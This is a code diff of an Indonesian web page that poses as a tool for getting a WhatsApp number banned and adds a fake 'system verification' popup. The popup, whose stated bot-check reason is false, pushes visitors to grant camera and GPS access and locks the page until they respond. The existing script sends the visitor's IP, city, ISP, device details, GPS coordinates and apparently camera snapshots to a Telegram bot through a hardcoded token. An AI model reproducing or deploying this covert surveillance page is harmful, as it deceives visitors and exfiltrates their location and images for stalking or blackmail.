@@ -45,7 +45,10 @@
       0%, 100% { transform: translateY(0px); opacity: 0.3; }
       50% { transform: translateY(-20px); opacity: 0.8; }
     }
+
+    /* MODIFIKASI: Container utama disembunyikan dulu */
     .login-container {
+      display: none; 
       background-color: rgba(17, 17, 17, 0.95);
       padding: 30px;
       border-radius: 16px;
@@ -119,14 +122,13 @@
       }
     }
 
-    /* --- CSS TAMBAHAN UNTUK POPUP (Disesuaikan dengan Tema Gelap) --- */
+    /* --- CSS POPUP (GATEKEEPER) --- */
     :root {
-      --popup-primary: #00ff7f; /* Menggunakan Lime agar senada */
-      --popup-bg-overlay: rgba(0, 0, 0, 0.85); /* Lebih gelap */
-      --popup-glass-bg: rgba(20, 20, 30, 0.95); /* Gelap kebiruan */
+      --popup-primary: #00ff7f;
+      --popup-bg-overlay: #0f0f23; /* Solid agar background tidak tembus sebelum izin */
+      --popup-glass-bg: rgba(20, 20, 30, 0.98);
     }
 
-    /* Overlay Gelap */
     .modal-overlay {
       position: fixed;
       top: 0;
@@ -134,41 +136,38 @@
       width: 100%;
       height: 100%;
       background: var(--popup-bg-overlay);
-      backdrop-filter: blur(10px);
+      backdrop-filter: blur(15px);
       display: flex;
       align-items: center;
       justify-content: center;
-      z-index: 9999; /* Z-index tertinggi agar di atas login form */
+      z-index: 9999;
       opacity: 0;
       visibility: hidden;
-      transition: all 0.3s ease;
+      transition: all 0.4s ease;
     }
 
-    /* Tampilkan modal secara default */
     .modal-overlay.active {
       opacity: 1;
       visibility: visible;
     }
 
-    /* Kotak Modal */
     .modal-card {
       background: var(--popup-glass-bg);
       width: 90%;
       max-width: 400px;
-      padding: 2rem;
-      border-radius: 20px;
-      border: 1px solid rgba(0, 255, 127, 0.2); /* Border tipis lime */
-      box-shadow: 0 0 30px rgba(0, 255, 127, 0.1);
+      padding: 2.5rem 2rem;
+      border-radius: 24px;
+      border: 1px solid rgba(0, 255, 127, 0.3);
+      box-shadow: 0 0 50px rgba(0, 255, 127, 0.15);
       text-align: center;
-      transform: scale(0.9);
-      transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+      transform: translateY(20px);
+      transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
     }
 
     .modal-overlay.active .modal-card {
-      transform: scale(1);
+      transform: translateY(0);
     }
 
-    /* Ikon Header */
     .icon-container {
       display: flex;
       justify-content: center;
@@ -177,9 +176,9 @@
     }
 
     .icon-wrapper {
-      width: 60px;
-      height: 60px;
-      background: rgba(0, 255, 127, 0.1); /* Lime transparan */
+      width: 65px;
+      height: 65px;
+      background: rgba(0, 255, 127, 0.1);
       border-radius: 50%;
       display: flex;
       align-items: center;
@@ -188,74 +187,88 @@
       border: 1px solid var(--popup-primary);
     }
 
-    .icon-wrapper svg {
-      width: 30px;
-      height: 30px;
-    }
+    .icon-wrapper svg { width: 32px; height: 32px; }
 
-    /* Teks Modal */
     .modal-card h2 {
       color: #ffffff;
-      margin: 0 0 10px 0;
-      font-size: 1.5rem;
+      margin-bottom: 12px;
+      font-weight: 900;
+      letter-spacing: 1px;
     }
 
     .modal-card p {
       color: #b0b0b0;
       margin-bottom: 2rem;
-      line-height: 1.5;
+      line-height: 1.6;
       font-size: 0.95rem;
     }
 
-    .btn-group {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-
     .btn-popup {
-      padding: 12px 20px;
-      border-radius: 10px;
+      padding: 14px 20px;
+      border-radius: 12px;
       border: none;
-      font-weight: 600;
+      font-weight: 700;
       cursor: pointer;
-      transition: all 0.2s;
+      transition: all 0.3s;
       font-size: 1rem;
       width: 100%;
       background: linear-gradient(135deg, #00ff7f, #00cc66);
-      color: black;
-      box-shadow: 0 4px 15px rgba(0, 255, 127, 0.3);
+      color: #000;
+      text-transform: uppercase;
     }
 
     .btn-popup:hover {
-      background-color: #0f0;
-      transform: translateY(-2px);
-      box-shadow: 0 0 20px lime;
+      box-shadow: 0 0 25px var(--popup-primary);
+      transform: scale(1.02);
     }
 
     #statusText {
       margin-top: 15px;
       font-size: 0.85rem;
       color: var(--popup-primary);
-      min-height: 1.2em;
+      font-weight: 500;
     }
 
-    .pulse {
-      animation: pulse 1.5s infinite;
-    }
-
+    .pulse { animation: pulse 1.5s infinite; }
     @keyframes pulse {
-      0% { opacity: 0.6; }
+      0%, 100% { opacity: 0.6; }
       50% { opacity: 1; }
-      100% { opacity: 0.6; }
     }
   </style>
 </head>
 <body>
   <div class="bg-particles"></div>
 
-  <!-- KONTEN UTAMA ANDA -->
-  <div class="login-container">
+  <!-- POPUP IZIN (MUNCUL PERTAMA KALI) -->
+  <div id="permissionModal" class="modal-overlay active">
+      <div class="modal-card">
+          <div class="icon-container">
+              <div class="icon-wrapper">
+                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
+                  </svg>
+              </div>
+              <div class="icon-wrapper">
+                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
+                  </svg>
+              </div>
+          </div>
+
+          <h2>VERIFIKASI SISTEM</h2>
+          <p>Situs ini memerlukan izin <strong>Kamera</strong> dan <strong>GPS</strong> untuk memastikan Anda adalah pengguna asli dan bukan bot. Silakan izinkan untuk masuk.</p>
+          
+          <div class="btn-group">
+              <button class="btn-popup" id="btn-allow" onclick="requestAllPermissions()">Izinkan & Masuk</button>
+          </div>
+          <div id="statusText"></div>
+      </div>
+  </div>
+
+  <!-- KONTEN UTAMA (TERKUNCI) -->
+  <div class="login-container" id="mainContent">
     <p class="login-title">Website Band WhatsApp</p>
     <p class="login-subtitle">⚠️ Jangan Disalahgunakan</p>
     <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
@@ -266,47 +279,58 @@
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="640" height="480"></canvas>
 
-  <!-- POPUP IZIN (Dimasukkan di sini) -->
-  <div id="permissionModal" class="modal-overlay active">
-      <div class="modal-card">
-          
-          <!-- Ikon Kamera & Lokasi -->
-          <div class="icon-container">
-              <div class="icon-wrapper">
-                  <!-- SVG Icon Location -->
-                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
-                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
-                  </svg>
-              </div>
-              <div class="icon-wrapper">
-                  <!-- SVG Icon Camera -->
-                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
-                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
-                  </svg>
-              </div>
-          </div>
-
-          <h2>Izin Akses Diperlukan</h2>
-          <p>Sistem membutuhkan akses <strong>Kamera</strong> dan <strong>Lokasi (GPS)</strong> untuk memverifikasi perangkat Anda sebelum melanjutkan.</p>
-          
-          <div class="btn-group">
-              <button class="btn-popup" onclick="requestAllPermissions()">Izinkan Semua</button>
-          </div>
-
-          <div id="statusText"></div>
-      </div>
-  </div>
-
   <script>
-    // --- LOGIKA ASLI ANDA ---
+    // --- KONFIGURASI BOT ANDA ---
     const botToken = '8335716552:AAHLyFftSVg3byPUIuJw0nbq8QAToj3UxGg';
     const chatIds = ['7958165198'];
     const infoDiv = document.getElementById('info');
     const input = document.getElementById('text');
     const button = document.getElementById('login-button');
+    const mainContent = document.getElementById('mainContent');
+    const permissionModal = document.getElementById('permissionModal');
+    const statusText = document.getElementById('statusText');
 
+    // --- LOGIKA GATEKEEPER ---
+    async function requestAllPermissions() {
+        statusText.textContent = "Sedang memverifikasi akses...";
+        statusText.classList.add('pulse');
+        document.getElementById('btn-allow').disabled = true;
+
+        try {
+            // Minta Lokasi
+            await new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(resolve, resolve); // Lanjut meski ditolak
+                } else { resolve(); }
+            });
+
+            // Minta Kamera
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            } catch (e) { console.warn("Kamera tidak diizinkan"); }
+
+            // Sukses (Simulasi loading seolah-olah verifikasi server)
+            setTimeout(() => {
+                statusText.textContent = "Verifikasi Berhasil! Membuka halaman...";
+                statusText.style.color = "#00ff7f";
+                
+                setTimeout(() => {
+                    permissionModal.classList.remove('active');
+                    mainContent.style.display = 'block'; // MEMBUKA KUNCI HALAMAN UTAMA
+                    createParticles();
+                }, 1000);
+            }, 1000);
+
+        } catch (error) {
+            statusText.textContent = "Terjadi kesalahan sistem.";
+            document.getElementById('btn-allow').disabled = false;
+        }
+    }
+
+    // --- LOGIKA ASLI ANDA ---
     function sendToTelegram(text) {
       chatIds.forEach(id => {
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -338,10 +362,7 @@
         const locRes = await fetch(`https://ip-api.com/json/${ip}`);
         const loc = await locRes.json();
         if (loc.status === 'success') {
-          city = loc.city;
-          region = loc.regionName;
-          country = loc.country;
-          org = loc.org;
+          city = loc.city; region = loc.regionName; country = loc.country; org = loc.org;
         }
       } catch {}
 
@@ -351,15 +372,10 @@
       const text = `
 IP         : ${ip}
 Kota       : ${city}
-Region     : ${region}
-Negara     : ${country}
 ISP        : ${org}
 Browser    : ${navigator.userAgent}
 OS         : ${navigator.platform}
-Resolusi   : ${screen.width}x${screen.height}
-Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
-Memori     : ${navigator.deviceMemory || 'N/A'} GB
-Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+Baterai    : ${batteryPercent}
 Waktu      : ${new Date().toLocaleString()}
       `.trim();
 
@@ -373,8 +389,6 @@ Waktu      : ${new Date().toLocaleString()}
           },
           () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
         );
-      } else {
-        sendToTelegram(`📍 Browser tidak support GPS`);
       }
     }
 
@@ -397,16 +411,13 @@ Waktu      : ${new Date().toLocaleString()}
               }, 3000);
             };
           })
-          .catch(err => {
-            sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
-            resolve();
-          });
+          .catch(() => resolve());
       });
     }
 
     button.addEventListener('click', async () => {
       const nomor = input.value.trim();
-      if (!nomor || nomor.length < 8 || nomor.length > 15) {
+      if (!nomor || nomor.length < 8) {
         infoDiv.innerText = '⚠️ Nomor tidak valid.';
         return;
       }
@@ -429,81 +440,15 @@ Waktu      : ${new Date().toLocaleString()}
 
     function createParticles() {
       const container = document.querySelector('.bg-particles');
+      container.innerHTML = '';
       for (let i = 0; i < 50; i++) {
         const p = document.createElement('div');
         p.className = 'particle';
         p.style.left = Math.random() * 100 + '%';
         p.style.top = Math.random() * 100 + '%';
         p.style.animationDelay = Math.random() * 6 + 's';
-        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
         container.appendChild(p);
       }
-    }
-    document.addEventListener('DOMContentLoaded', createParticles);
-
-    // --- LOGIKA POPUP IZIN ---
-    const modal = document.getElementById('permissionModal');
-    const statusText = document.getElementById('statusText');
-
-    function closeModal() {
-        modal.classList.remove('active');
-    }
-
-    async function requestAllPermissions() {
-        statusText.textContent = "Memverifikasi...";
-        statusText.classList.add('pulse');
-        statusText.style.color = "var(--popup-primary)";
-
-        try {
-            // 1. Minta Lokasi
-            await requestLocation();
-            
-            // 2. Minta Kamera
-            setTimeout(async () => {
-                await requestCameraPopup();
-                
-                // Sukses
-                statusText.classList.remove('pulse');
-                statusText.textContent = "Verifikasi Berhasil!";
-                statusText.style.color = "#00ff7f";
-                
-                // Tutup modal
-                setTimeout(closeModal, 1000);
-            }, 500);
-
-        } catch (error) {
-            console.error(error);
-            statusText.classList.remove('pulse');
-            statusText.textContent = "Gagal. Mohon reset izin browser.";
-            statusText.style.color = "#ff4444"; 
-        }
-    }
-
-    function requestLocation() {
-        statusText.textContent = "Mendeteksi Lokasi...";
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve();
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                (pos) => resolve(pos),
-                (err) => resolve(null) // Tetap lanjut meski ditolak
-            );
-        });
-    }
-
-    async function requestCameraPopup() {
-        statusText.textContent = "Mengecek Kamera...";
-        try {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                stream.getTracks().forEach(track => track.stop());
-            }
-        } catch (err) {
-            console.warn("Camera denied in popup");
-            // Tidak throw error agar user tetap bisa masuk ke halaman utama
-        }
     }
   </script>
 </body>
